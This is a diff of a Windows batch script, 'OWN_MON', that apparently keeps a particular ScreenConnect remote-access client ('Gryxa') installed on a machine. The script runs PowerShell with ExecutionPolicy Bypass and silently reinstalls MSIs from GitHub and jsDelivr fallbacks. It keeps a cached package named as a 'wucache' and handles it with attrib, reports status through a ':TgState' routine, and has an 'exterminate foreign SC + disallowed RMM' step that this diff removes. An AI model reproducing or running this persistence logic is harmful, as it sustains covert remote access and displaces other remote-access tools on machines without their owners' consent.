@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M47
+rem  OWN_MON  BUILD 20260804M48
+rem  M48: HANDS-OFF all SC interrupt — only Gryxa install-if-absent. No exterminate/sevrz /i/sc delete.
 rem  M47: HARD stop Gryxa interrupts — no raw sevrz /i; detect any non-sevrz SC; adopt live FP.
 rem  M46: START_PENDING = alive; never /x Gryxa while service exists (connect-drop).
 rem  M45: L42 safe FP migrate (install new before removing old Gryxa).
@@ -46,7 +47,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M47"
+set "MONVER=M48"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -223,9 +224,8 @@ if exist "%WD%\own_lib.ps1" (
   if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 )
 
-rem ── [E] exterminate foreign SC + disallowed RMM (AFTER Gryxa FP sync) ──
-if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
-timeout /t 8 /nobreak >nul
+rem ── [E] L45/M48 HANDS-OFF: skip exterminate (do not touch any ScreenConnect) ──
+echo hands_off_skip_exterminate>>"%LOG%"
 set "FOREIGN_LEFT=0"
 for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
   set "FP=%%a"
@@ -288,9 +288,9 @@ if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
   if exist "%WD%\own_lib.ps1" for /f "delims=" %%R in ('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"') do set "REGSTATE=%%R"
   echo orphan_check=!REGSTATE!>>"%LOG%"
   if /I "!REGSTATE!"=="no" (
-    echo orphan_service_delete>>"%LOG%"
-    sc delete "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
-    set "INSTALLED=0"
+    echo orphan_service_delete_SKIPPED_hands_off>>"%LOG%"
+    rem M48: never sc delete any ScreenConnect
+
   )
 )
 if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
@@ -343,33 +343,14 @@ for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE
 )
 if /I "!GREG!"=="yes" (
   echo primary_skip_i_protect_gryxa>>"%LOG%"
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "protect-gryxa-skip-primary-i" >nul 2>&1
-  call :TgState DOWN "Primary missing - refused sevrz /i to protect Gryxa (shared SC UpgradeCodes); /fa only"
+  echo hands_off_gryxa_present_skip_sevrz>>"%LOG%"
+  call :EnsureGryxaMust
   goto :AfterHeal
 )
-if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
-if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1%?t=%RANDOM%" "github-pkg"
-if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
-if "%INSTALLED%"=="0" (
-  rem M47: cached pkg — protect-msi then /i (never raw Upgrade table)
-  attrib -h -s -r "%MSICACHE%" >nul 2>&1
-  for %%F in ("%MSICACHE%") do if %%~zF GTR 1000000 (
-    echo wucache_pkg_protected_install>>"%LOG%"
-    attrib -h -s -r "%MSI%" >nul 2>&1
-    copy /y "%MSICACHE%" "%MSI%" >nul 2>&1
-    set "MSI_SAFE=%MSI%"
-    if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -Extra "%MSI%" -WorkDir "%WD%"`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
-    if /I "!MSI_SAFE!"=="%MSI%" (
-      echo wucache_pkg_protect_fail_skip_i>>"%LOG%"
-    ) else (
-      call :NoMsiPolicy
-      msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
-      set "MSIEXIT=!ERRORLEVEL!"
-      echo cache_protected msiexec exit=!MSIEXIT!>>"%LOG%"
-      call :WaitSvc
-    )
-  )
-)
+rem M48 HANDS-OFF: skip all sevrz msiexec /i / sc-family installs
+echo hands_off_skip_sevrz_msi>>"%LOG%"
+call :EnsureGryxaMust
+goto :AfterHeal
 call :RestoreAlt
 call :EnsureGryxaMust
 if "%INSTALLED%"=="0" (
